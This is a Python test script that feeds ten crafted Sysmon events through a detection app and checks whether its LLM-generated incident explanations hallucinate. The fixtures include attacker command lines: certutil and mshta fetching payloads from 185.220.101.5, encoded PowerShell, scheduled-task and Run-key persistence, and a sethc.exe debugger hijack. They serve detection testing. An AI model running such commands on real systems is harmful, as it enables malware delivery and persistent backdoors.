"""Hallucination spot-check: explain 10 crafted incidents and save the output
for manual review against ground truth.

Each crafted Sysmon record is pushed through the real app -- ingest,
detection, grouping, severity, retrieval and the real LLM -- with only the
EVTX reader patched. Everything runs against a throwaway in-memory SQLite
database, so the script never writes to the configured Postgres.

Run from the repository root (needs the knowledge base and GROQ_API_KEY):
    ./backend/venv/Scripts/python ai/tools/hallucination_spot_check.py
    ./backend/venv/Scripts/python ai/tools/hallucination_spot_check.py --no-llm   # detection only

Output: ai/tools/hallucination_spot_check_output.json. For each case, check
that the explanation states only details present in the incident evidence
and names the expected technique.
"""

import argparse
import json
import sys
import time
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "backend"))  # <repo>/backend

from fastapi.testclient import TestClient  # noqa: E402
from sqlalchemy import create_engine  # noqa: E402
from sqlalchemy.orm import sessionmaker  # noqa: E402
from sqlalchemy.pool import StaticPool  # noqa: E402

from app.core.auth import CSRF_HEADER, require_session_auth  # noqa: E402
from app.db.base import Base  # noqa: E402
from app.db.session import get_db  # noqa: E402
from app.main import app  # noqa: E402
from app.models.incident import Incident  # noqa: E402

_TIMESTAMP = "2026-08-19T12:00:00.000000+00:00"
_SYSMON = "Microsoft-Windows-Sysmon/Operational"


def _record(event_id: str, computer: str, data: dict[str, str]) -> dict:
    return {
        "Event": {
            "System": {
                "EventID": event_id,
                "Channel": _SYSMON,
                "TimeCreated": {"@SystemTime": _TIMESTAMP},
                "Computer": computer,
            },
            "EventData": {"Data": [{"@Name": k, "#text": v} for k, v in data.items()]},
        }
    }


# One crafted record per behaviour, each on its own host so every match
# becomes its own incident. `technique_id` is this script's own ground truth,
# independent of what the engine computes, so a mismatch is itself a finding.
SPOT_CHECK_CASES = [
    {
        "host": "SPOTCHECK-01",
        "behaviour": "Suspicious Encoded PowerShell Command",
        "technique_id": "T1059.001",
        "record": _record(
            "1",
            "SPOTCHECK-01",
            {
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": "powershell.exe -enc JABzAD0AJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADUAJwA=",
                "User": "SPOTCHECK-01\\jdoe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-02",
        "behaviour": "PowerShell Execution Policy Bypass",
        "technique_id": "T1059.001",
        "record": _record(
            "1",
            "SPOTCHECK-02",
            {
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": r"powershell.exe -nop -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1",
                "User": "SPOTCHECK-02\\jdoe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-03",
        "behaviour": "Certutil Download via urlcache/split Flags",
        "technique_id": "T1105",
        "record": _record(
            "1",
            "SPOTCHECK-03",
            {
                "Image": r"C:\Windows\System32\certutil.exe",
                "CommandLine": r"certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe C:\Users\Public\payload.exe",
                "User": "SPOTCHECK-03\\jdoe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-04",
        "behaviour": "Network Connection from a Proxy-Execution LOLBin",
        "technique_id": "T1071.001",
        "record": _record(
            "3",
            "SPOTCHECK-04",
            {
                "Image": r"C:\Windows\System32\rundll32.exe",
                "User": "SPOTCHECK-04\\jdoe",
                "Initiated": "true",
                "Protocol": "tcp",
                "SourceIp": "10.0.0.15",
                "SourcePort": "52344",
                "DestinationIp": "185.220.101.5",
                "DestinationPort": "443",
            },
        ),
    },
    {
        "host": "SPOTCHECK-05",
        "behaviour": "Suspicious Executable Written to Public or Temp Directory",
        "technique_id": "T1105",
        "record": _record(
            "11",
            "SPOTCHECK-05",
            {
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "User": "SPOTCHECK-05\\jdoe",
                "TargetFilename": r"C:\Users\Public\update.exe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-06",
        "behaviour": "Registry Run Key Persistence",
        "technique_id": "T1547.001",
        "record": _record(
            "13",
            "SPOTCHECK-06",
            {
                "TargetObject": r"HKU\S-1-5-21-1111111111-2222222222-3333333333-1001\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
                "Details": r"C:\Users\Public\update.exe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-07",
        "behaviour": "Registry IFEO Debugger Hijack",
        "technique_id": "T1546.012",
        "record": _record(
            "13",
            "SPOTCHECK-07",
            {
                "TargetObject": r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",
                "Details": r"C:\Windows\System32\cmd.exe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-08",
        "behaviour": "Scheduled Task Creation via schtasks.exe",
        "technique_id": "T1053.005",
        "record": _record(
            "1",
            "SPOTCHECK-08",
            {
                "Image": r"C:\Windows\System32\schtasks.exe",
                "CommandLine": r"schtasks.exe /create /tn Updater /tr C:\Users\Public\update.exe /sc onlogon /ru SYSTEM",
                "User": "SPOTCHECK-08\\jdoe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-09",
        "behaviour": "Suspicious Scheduled Task via PowerShell Cmdlet",
        "technique_id": "T1053.005",
        "record": _record(
            "1",
            "SPOTCHECK-09",
            {
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": r"powershell.exe -Command \"$A = New-ScheduledTaskAction -Execute 'C:\Users\Public\update.exe'; Register-ScheduledTask -TaskName Updater -Action $A\"",
                "User": "SPOTCHECK-09\\jdoe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-10",
        "behaviour": "Suspicious Mshta Execution",
        "technique_id": "T1218.005",
        "record": _record(
            "1",
            "SPOTCHECK-10",
            {
                "Image": r"C:\Windows\System32\mshta.exe",
                "CommandLine": "mshta.exe http://185.220.101.5/payload.hta",
                "User": "SPOTCHECK-10\\jdoe",
            },
        ),
    },
]


def _in_memory_db():
    engine = create_engine(
        "sqlite+pysqlite:///:memory:", connect_args={"check_same_thread": False}, poolclass=StaticPool
    )
    Base.metadata.create_all(engine)
    return sessionmaker(bind=engine, autocommit=False, autoflush=False)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--no-llm", action="store_true", help="check detection only; skip the explain calls")
    parser.add_argument(
        "--pause", type=float, default=0.0,
        help="seconds to wait between explain calls (the free Groq tier allows 8,000 tokens a minute; "
        "one explanation with its self-critique uses about 5,000, so use 60 there)",
    )
    args = parser.parse_args()

    session_factory = _in_memory_db()

    def _override_get_db():
        db = session_factory()
        try:
            yield db
        finally:
            db.close()

    app.dependency_overrides[get_db] = _override_get_db
    app.dependency_overrides[require_session_auth] = lambda: None
    client = TestClient(app, headers={CSRF_HEADER: "1"})
    output: dict = {}

    print(f"Ingesting {len(SPOT_CHECK_CASES)} crafted records (one host each) ...")
    records = [case["record"] for case in SPOT_CHECK_CASES]
    with patch("app.api.routes_ingest.read_records_as_dicts", lambda path: iter(records)):
        response = client.post(
            "/ingest",
            files={"file": ("spot_check.evtx", b"irrelevant, reader is patched", "application/octet-stream")},
        )
    print(f"  HTTP {response.status_code}")
    body = response.json()
    output["ingest"] = {"status_code": response.status_code, "body": body}
    incident_ids = body.get("incident_ids", []) if response.status_code == 200 else []

    host_to_incident: dict[str, dict] = {}
    with session_factory() as db:
        for incident_id in incident_ids:
            incident = db.get(Incident, incident_id)
            if incident is not None:
                host_to_incident[incident.host] = {
                    "incident_id": incident.id,
                    "title": incident.title,
                    "severity": incident.severity,
                    "mitre_technique_ids": incident.mitre_technique_ids,
                }

    spot_checks = []
    mismatches = 0
    for case in SPOT_CHECK_CASES:
        host = case["host"]
        info = host_to_incident.get(host)
        entry = {
            "host": host,
            "ground_truth": {"behaviour": case["behaviour"], "expected_technique_id": case["technique_id"]},
            "incident": info,
        }
        if info is None:
            entry["error"] = "no incident -- no rule matched this record"
            mismatches += 1
            print(f"  {host}: NO INCIDENT ({case['behaviour']})")
        else:
            techniques = info["mitre_technique_ids"]
            ok = case["technique_id"] in techniques
            mismatches += 0 if ok else 1
            print(f"  {host}: incident {info['incident_id']} {techniques} {'ok' if ok else 'TECHNIQUE MISMATCH'}")
            if not args.no_llm:
                if args.pause and spot_checks:
                    time.sleep(args.pause)
                try:
                    resp = client.post(f"/incidents/{info['incident_id']}/explain")
                    if resp.status_code == 200:
                        entry["explain_response"] = resp.json()
                    else:
                        entry["explain_error"] = f"HTTP {resp.status_code}: {resp.text}"
                        print(f"    explain failed: HTTP {resp.status_code}")
                except Exception as exc:  # noqa: BLE001 -- record any failure, keep going
                    entry["explain_error"] = f"{type(exc).__name__}: {exc}"
        spot_checks.append(entry)

    output["spot_checks"] = spot_checks
    app.dependency_overrides.clear()

    out_path = Path(__file__).resolve().parent / "hallucination_spot_check_output.json"
    out_path.write_text(json.dumps(output, indent=2, ensure_ascii=False), encoding="utf-8")
    print()
    print(f"{len(SPOT_CHECK_CASES) - mismatches}/{len(SPOT_CHECK_CASES)} cases detected with the expected technique")
    print(f"Wrote {out_path}")


if __name__ == "__main__":
    main()
